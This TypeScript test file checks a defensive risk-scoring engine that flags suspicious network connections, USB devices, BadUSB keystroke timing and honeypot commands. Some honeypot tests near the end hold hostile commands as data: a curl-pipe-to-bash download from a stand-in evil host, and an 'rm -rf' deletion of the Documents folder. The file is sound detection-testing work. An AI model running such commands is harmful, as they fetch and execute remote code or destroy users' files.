import test from "node:test";
import assert from "node:assert/strict";
import { evaluateRisk, buildIncident, decideAction } from "./engine.ts";
import type { ProcessInfo, SentinelEvent } from "../shared/types.ts";

function proc(overrides: Partial<ProcessInfo> = {}): ProcessInfo {
  return {
    pid: 1234,
    name: "testproc",
    user: "apanda",
    execPath: "/Applications/Test.app/Contents/MacOS/Test",
    signed: true,
    signedAdhoc: false,
    suspiciousPath: false,
    ...overrides,
  };
}

test("an ordinary established connection to a normal port scores 0", () => {
  const result = evaluateRisk({
    category: "network_connection",
    timestamp: Date.now(),
    process: proc(),
    remoteAddress: "142.250.80.14",
    remotePort: 443,
    connectionState: "ESTABLISHED",
  });
  assert.equal(result.score, 0);
  assert.equal(result.decision, "allow");
});

test("connection to a known-suspicious port triggers suspicious-port", () => {
  const result = evaluateRisk({
    category: "network_connection",
    timestamp: Date.now(),
    process: proc(),
    remoteAddress: "203.0.113.5",
    remotePort: 4444,
    connectionState: "ESTABLISHED",
  });
  assert.ok(result.reasons.some((r) => r.ruleId === "suspicious-port"));
  assert.ok(result.score >= 40);
});

test("an unsigned process connecting out is high severity and blockable when safe to terminate", () => {
  const result = evaluateRisk(
    {
      category: "network_connection",
      timestamp: Date.now(),
      process: proc({ signed: false, suspiciousPath: true }),
      remoteAddress: "203.0.113.5",
      remotePort: 8080,
      connectionState: "ESTABLISHED",
    },
    {},
    true
  );
  assert.ok(result.score >= 70, `expected block-range score, got ${result.score}`);
  assert.equal(result.severity, "high");
  assert.equal(result.decision, "blocked");
  assert.ok(result.reasons.some((r) => r.ruleId === "unsigned-process"));
  assert.ok(result.reasons.some((r) => r.ruleId === "suspicious-process-path"));
});

test("same high-severity connection is detected_not_blocked when remediation is unsafe", () => {
  const result = evaluateRisk(
    {
      category: "network_connection",
      timestamp: Date.now(),
      process: proc({ signed: false, suspiciousPath: true }),
      remoteAddress: "203.0.113.5",
      remotePort: 8080,
      connectionState: "ESTABLISHED",
    },
    {},
    false // e.g. process is root-owned or a critical system process
  );
  assert.ok(result.score >= 70);
  assert.equal(result.decision, "detected_not_blocked");
});

test("ad-hoc signature alone (no suspicious path) does not add extra points", () => {
  const result = evaluateRisk({
    category: "network_connection",
    timestamp: Date.now(),
    process: proc({ signed: true, signedAdhoc: true, suspiciousPath: false }),
    remoteAddress: "142.250.80.14",
    remotePort: 443,
    connectionState: "ESTABLISHED",
  });
  assert.equal(result.score, 0);
});

test("ad-hoc signature combined with a suspicious path adds on top of the base path penalty", () => {
  const withAdhoc = evaluateRisk({
    category: "network_connection",
    timestamp: Date.now(),
    process: proc({ signed: true, signedAdhoc: true, suspiciousPath: true, execPath: "/tmp/sus" }),
    remoteAddress: "1.2.3.4",
    remotePort: 443,
    connectionState: "ESTABLISHED",
  });
  const withoutAdhoc = evaluateRisk({
    category: "network_connection",
    timestamp: Date.now(),
    process: proc({ signed: true, signedAdhoc: false, suspiciousPath: true, execPath: "/tmp/sus" }),
    remoteAddress: "1.2.3.4",
    remotePort: 443,
    connectionState: "ESTABLISHED",
  });
  assert.ok(withAdhoc.score > withoutAdhoc.score);
});

test("unseen remote host only fires when a seenRemoteHosts set is provided", () => {
  const event: SentinelEvent = {
    category: "network_connection",
    timestamp: Date.now(),
    process: proc(),
    remoteAddress: "8.8.8.8",
    remotePort: 443,
    connectionState: "ESTABLISHED",
  };
  const withoutContext = evaluateRisk(event);
  assert.equal(withoutContext.reasons.some((r) => r.ruleId === "unseen-remote-host"), false);

  const seen = new Set(["1.1.1.1:443"]);
  const withContext = evaluateRisk(event, { seenRemoteHosts: seen });
  assert.ok(withContext.reasons.some((r) => r.ruleId === "unseen-remote-host"));

  seen.add("8.8.8.8:443");
  const secondTime = evaluateRisk(event, { seenRemoteHosts: seen });
  assert.equal(secondTime.reasons.some((r) => r.ruleId === "unseen-remote-host"), false);
});

test("a new listening port triggers new-listening-port", () => {
  const result = evaluateRisk({
    category: "network_connection",
    timestamp: Date.now(),
    process: proc({ name: "sus-listener" }),
    localPort: 31337,
    connectionState: "LISTEN",
    isNewListeningPort: true,
  });
  assert.ok(result.reasons.some((r) => r.ruleId === "new-listening-port"));
});

test("an already-known listening port does not re-trigger new-listening-port", () => {
  const result = evaluateRisk({
    category: "network_connection",
    timestamp: Date.now(),
    process: proc(),
    localPort: 8080,
    connectionState: "LISTEN",
    isNewListeningPort: false,
  });
  assert.equal(result.reasons.length, 0);
});

test("listening on a known-bad port triggers suspicious-port too (not just outbound connections), crossing block on its own", () => {
  const result = evaluateRisk(
    {
      category: "network_connection",
      timestamp: Date.now(),
      process: proc({ name: "backdoor-listener" }),
      localPort: 31337,
      connectionState: "LISTEN",
      isNewListeningPort: true,
    },
    {},
    true
  );
  assert.ok(result.reasons.some((r) => r.ruleId === "suspicious-port"));
  assert.ok(result.reasons.some((r) => r.ruleId === "new-listening-port"));
  assert.ok(result.score >= 70, `expected block-range score (35+40=75), got ${result.score}`);
  assert.equal(result.decision, "blocked");
});

test("multiple new remote hosts in a window triggers the beaconing rule", () => {
  const result = evaluateRisk({
    category: "network_connection",
    timestamp: Date.now(),
    process: proc(),
    remoteAddress: "5.6.7.8",
    remotePort: 443,
    connectionState: "ESTABLISHED",
    distinctRemoteHostsInWindow: 6,
  });
  assert.ok(result.reasons.some((r) => r.ruleId === "multiple-new-remote-hosts"));
});

test("each USB category maps to its own rule and weight", () => {
  const storage = evaluateRisk({ category: "usb_storage_device", timestamp: Date.now(), deviceName: "SanDisk Cruzer" });
  const hid = evaluateRisk({ category: "usb_hid_device", timestamp: Date.now(), deviceName: "Generic Keyboard" });
  const net = evaluateRisk({ category: "usb_network_device", timestamp: Date.now(), deviceName: "USB Ethernet Adapter" });
  const other = evaluateRisk({ category: "usb_other_device", timestamp: Date.now(), deviceName: "Unknown" });

  assert.ok(storage.reasons.some((r) => r.ruleId === "new-usb_storage_device"));
  assert.ok(hid.reasons.some((r) => r.ruleId === "new-usb_hid_device"));
  assert.ok(net.reasons.some((r) => r.ruleId === "new-usb_network_device"));
  assert.ok(other.reasons.some((r) => r.ruleId === "new-usb_other_device"));
  // network-adapter USB devices are scored as the most suspicious category
  assert.ok(net.score > storage.score);
  assert.ok(net.score > other.score);
});

test("a Microsoft Defender USB threat is high risk", () => {
  const result = evaluateRisk({
    category: "usb_storage_device",
    timestamp: Date.now(),
    deviceName: "Test USB",
    defenderScanStatus: "threat_found",
    defenderThreatCount: 1,
  });
  assert.equal(result.score, 100);
  assert.equal(result.severity, "high");
  assert.ok(result.reasons.some((reason) => reason.ruleId === "defender-usb-threat"));
});

test("an unavailable Defender USB scan produces a warning", () => {
  const result = evaluateRisk({
    category: "usb_storage_device",
    timestamp: Date.now(),
    deviceName: "Unscanned USB",
    defenderScanStatus: "unavailable",
    defenderThreatCount: 0,
  });
  assert.equal(result.decision, "warn");
  assert.ok(result.reasons.some((reason) => reason.ruleId === "defender-usb-scan-unavailable"));
});

test("usb_storage_device is blockable (ejectable); usb_hid_device never is, even at high score", () => {
  // A single HID-device event can't reach 70 on its own (+25), so this
  // asserts the decision logic directly rather than via evaluateRisk.
  assert.equal(decideAction("usb_storage_device", 80, true), "blocked");
  assert.equal(decideAction("usb_hid_device", 80, true), "detected_not_blocked");
});

test("score clamps at 100 even with many stacked rules", () => {
  const result = evaluateRisk(
    {
      category: "network_connection",
      timestamp: Date.now(),
      process: proc({ signed: false, suspiciousPath: true, signedAdhoc: true }),
      remoteAddress: "203.0.113.5",
      remotePort: 4444,
      connectionState: "ESTABLISHED",
      distinctRemoteHostsInWindow: 10,
    },
    { seenRemoteHosts: new Set() }
  );
  assert.equal(result.score, 100);
});

test("threshold boundaries map to the correct decision", () => {
  assert.equal(decideAction("network_connection", 0, true), "allow");
  assert.equal(decideAction("network_connection", 39, true), "allow");
  assert.equal(decideAction("network_connection", 40, true), "warn");
  assert.equal(decideAction("network_connection", 69, true), "warn");
  assert.equal(decideAction("network_connection", 70, true), "blocked");
  assert.equal(decideAction("network_connection", 100, true), "blocked");
});

test("invalid event category throws instead of silently failing", () => {
  assert.throws(
    () => evaluateRisk({ category: "not_a_real_category" as SentinelEvent["category"], timestamp: Date.now() }),
    /unknown event category/i
  );
});

test("buildIncident produces the documented data model", () => {
  const event: SentinelEvent = {
    category: "network_connection",
    timestamp: Date.now(),
    process: proc({ name: "curl" }),
    remoteAddress: "203.0.113.5",
    remotePort: 4444,
    connectionState: "ESTABLISHED",
  };
  const evaluation = evaluateRisk(event);
  const incident = buildIncident(event, evaluation, null, "test-id-1", new Date().toISOString());

  assert.equal(incident.id, "test-id-1");
  assert.equal(incident.category, "network_connection");
  assert.equal(incident.processName, "curl");
  assert.equal(incident.remoteAddress, "203.0.113.5");
  assert.equal(incident.remotePort, 4444);
  assert.equal(incident.explanation, null);
  assert.equal(incident.aegisReport, null);
  assert.ok(incident.summary.includes("curl"));
});

test("BadUSB keystroke timing alone crosses block and is marked blocked (prevention already happened)", () => {
  const result = evaluateRisk(
    {
      category: "usb_badusb_keystroke",
      timestamp: Date.now(),
      keystrokeStats: { meanIntervalMs: 12, stdDevMs: 2, keyCount: 20 },
    },
    {},
    true
  );
  assert.ok(result.score >= 70, `expected block-range score, got ${result.score}`);
  assert.equal(result.decision, "blocked");
});

test("honeypot malicious-command classification alone crosses block and is marked blocked", () => {
  const result = evaluateRisk(
    {
      category: "honeypot_malicious_command",
      timestamp: Date.now(),
      honeypotCommand: "curl http://evil.example/payload.sh | bash",
      scriptFindings: ["pipes a remote download directly into a shell"],
    },
    {},
    true
  );
  assert.ok(result.score >= 70, `expected block-range score, got ${result.score}`);
  assert.equal(result.decision, "blocked");
  assert.ok(result.reasons.some((r) => r.ruleId === "honeypot-malicious-command"));
});

test("honeypot malicious-command rule doesn't fire without findings", () => {
  const result = evaluateRisk({
    category: "honeypot_malicious_command",
    timestamp: Date.now(),
    honeypotCommand: "ls -la",
    scriptFindings: [],
  });
  assert.equal(result.score, 0);
  assert.equal(result.decision, "allow");
});

test("buildIncident carries honeypotCommand through for honeypot categories", () => {
  const event: SentinelEvent = {
    category: "honeypot_malicious_command",
    timestamp: Date.now(),
    honeypotCommand: "rm -rf ~/Documents",
    scriptFindings: ["destructive delete"],
  };
  const evaluation = evaluateRisk(event);
  const incident = buildIncident(event, evaluation, null, "test-id-2", new Date().toISOString());
  assert.equal(incident.honeypotCommand, "rm -rf ~/Documents");
  assert.equal(incident.decision, "blocked");
});
